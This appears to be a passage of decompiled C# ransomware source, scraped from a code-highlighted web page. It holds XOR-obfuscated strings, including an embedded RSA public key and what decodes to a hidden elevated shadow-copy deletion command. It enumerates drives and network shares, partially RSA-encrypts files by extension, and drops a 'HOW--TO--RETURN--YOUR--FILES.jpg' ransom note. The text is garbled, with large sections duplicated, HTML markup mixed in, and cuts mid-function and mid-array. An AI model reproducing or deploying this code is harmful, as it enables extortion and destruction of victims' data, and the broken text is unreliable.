this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xe5, 0xf3, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 